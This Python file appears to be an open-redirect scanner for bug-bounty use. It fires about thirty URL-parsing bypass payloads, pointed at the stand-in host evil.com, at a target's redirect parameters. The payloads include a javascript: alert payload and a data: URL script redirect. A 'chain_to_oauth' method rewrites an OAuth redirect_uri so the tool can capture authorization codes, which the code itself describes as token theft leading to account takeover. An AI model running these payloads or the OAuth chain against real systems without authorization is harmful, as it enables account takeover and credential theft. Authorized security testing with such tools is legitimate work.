#!/usr/bin/env python3
"""
open_redirect.py — Open Redirect Scanner + OAuth Chain

30+ bypass techniques. Auto-chains to OAuth token theft when redirect_uri is
controlled. Open redirect alone = Low. Open redirect + OAuth = Critical ATO.

Usage:
    from open_redirect import OpenRedirectScanner
    scanner = OpenRedirectScanner()
    result = scanner.scan_url("https://target.com/login?next=https://evil.com")
"""
import json, os, re, time
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

try:
    import requests
except ImportError:
    requests = None

REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "redirect_uri", "next", "return",
    "returnTo", "return_url", "redir", "destination", "dest", "go", "goto",
    "target", "link", "out", "view", "ref", "continue", "forward",
    "callback", "cb", "path", "to", "checkout_url", "return_path",
]

BYPASS_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "/\\evil.com",
    "////evil.com/%2f..",
    "https://evil.com@{DOMAIN}",
    "https://{DOMAIN}@evil.com",
    "https://{DOMAIN}.evil.com",
    "https://evil.com#{DOMAIN}",
    "https://evil.com%23@{DOMAIN}",
    "https://evil.com%2f{DOMAIN}",
    "//%09/evil.com",
    "/%0d/evil.com",
    "/%5cevil.com",
    "https:evil.com",
    "http:evil.com",
    "https:%0a%0devil.com",
    "java%0d%0ascript:alert(1)",
    "/%2f%2fevil.com",
    "/evil.com",
    "https://evil.com/..;/",
    "https://evil%252ecom",
    "{DOMAIN}%40evil.com",
    "https://evil.com%00{DOMAIN}",
    "https://evil.com?{DOMAIN}",
    "https://evil.com&{DOMAIN}",
    "data:text/html,<script>document.location='https://evil.com'</script>",
    "https://evil。com",  # Unicode dot
    "https://evil.com\\@{DOMAIN}",
    "https://ⓔⓥⓘⓛ.com",  # Unicode circles
]


class OpenRedirectScanner:
    def __init__(self):
        self.findings = []
        self.session = requests.Session() if requests else None
        if self.session:
            self.session.verify = False
            self.session.max_redirects = 0
            import urllib3; urllib3.disable_warnings()

    def scan_url(self, url: str, headers: dict = None) -> dict:
        headers = headers or {}
        parsed = urlparse(url)
        domain = parsed.hostname or ""
        params = parse_qs(parsed.query, keep_blank_values=True)
        result = {"url": url, "vulnerable": False, "findings": []}

        # Find redirect params
        redirect_params = [p for p in params if p.lower() in REDIRECT_PARAMS]

        # Also test with common param names if none found in URL
        if not redirect_params:
            redirect_params = REDIRECT_PARAMS[:10]

        for param in redirect_params:
            for payload_template in BYPASS_PAYLOADS[:15]:
                payload = payload_template.replace("{DOMAIN}", domain)
                test_params = {**params, param: [payload]}
                test_url = urlunparse(parsed._replace(
                    query=urlencode(test_params, doseq=True)))

                try:
                    resp = self.session.get(test_url, headers=headers,
                                          timeout=8, allow_redirects=False)
                    location = resp.headers.get("Location", "")

                    if resp.status_code in (301, 302, 303, 307, 308):
                        if "evil.com" in location or "evil" in location.lower():
                            finding = {
                                "param": param,
                                "payload": payload[:80],
                                "redirect_to": location[:100],
                                "status": resp.status_code,
                                "severity": "LOW",
                            }
                            result["vulnerable"] = True
                            result["findings"].append(finding)
                            self.findings.append({
                                "type": "OPEN_REDIRECT", "url": url, **finding})
                            break  # Found bypass for this param

                except Exception:
                    continue
                time.sleep(0.2)

        return result

    def chain_to_oauth(self, redirect_url: str, oauth_url: str = "",
                       headers: dict = None) -> dict:
        """Chain open redirect to OAuth token theft."""
        headers = headers or {}
        result = {"type": "REDIRECT_TO_OAUTH_CHAIN", "vulnerable": False}

        if not oauth_url:
            return result

        # Replace redirect_uri in OAuth URL with our open redirect
        parsed = urlparse(oauth_url)
        params = parse_qs(parsed.query)
        params["redirect_uri"] = [redirect_url]
        chain_url = urlunparse(parsed._replace(
            query=urlencode(params, doseq=True)))

        try:
            resp = self.session.get(chain_url, headers=headers,
                                  timeout=8, allow_redirects=False)
            location = resp.headers.get("Location", "")

            if resp.status_code in (302, 301) and "code=" in location:
                result["vulnerable"] = True
                result["severity"] = "CRITICAL"
                result["evidence"] = f"Auth code in redirect: {location[:100]}"
                self.findings.append(result)

        except Exception:
            pass

        return result

    def scan_domain(self, base_url: str, headers: dict = None) -> dict:
        """Scan common redirect endpoints."""
        headers = headers or {}
        results = {"base_url": base_url, "endpoints_tested": 0,
                   "vulnerable": [], "total": 0}

        redirect_paths = [
            "/login?next=", "/auth?redirect=", "/oauth/callback?redirect_uri=",
            "/logout?return=", "/sso?returnTo=", "/redirect?url=",
            "/link?url=", "/go?to=", "/out?url=",
        ]

        for path in redirect_paths:
            url = f"{base_url.rstrip('/')}{path}https://evil.com"
            results["endpoints_tested"] += 1

            try:
                resp = self.session.get(url, headers=headers,
                                       timeout=5, allow_redirects=False)
                location = resp.headers.get("Location", "")

                if resp.status_code in (301, 302, 303, 307) and "evil.com" in location:
                    results["vulnerable"].append({
                        "url": url, "redirect_to": location[:100]})
                    self.findings.append({
                        "type": "OPEN_REDIRECT", "url": url,
                        "severity": "LOW", "redirect_to": location[:100]})
            except Exception:
                continue

        results["total"] = len(results["vulnerable"])
        return results

    def save_findings(self, target: str) -> None:
        out = Path(f"findings/{target}/open_redirect")
        out.mkdir(parents=True, exist_ok=True)
        if self.findings:
            (out / f"redirect_{int(time.time())}.json").write_text(
                json.dumps(self.findings, indent=2, default=str))
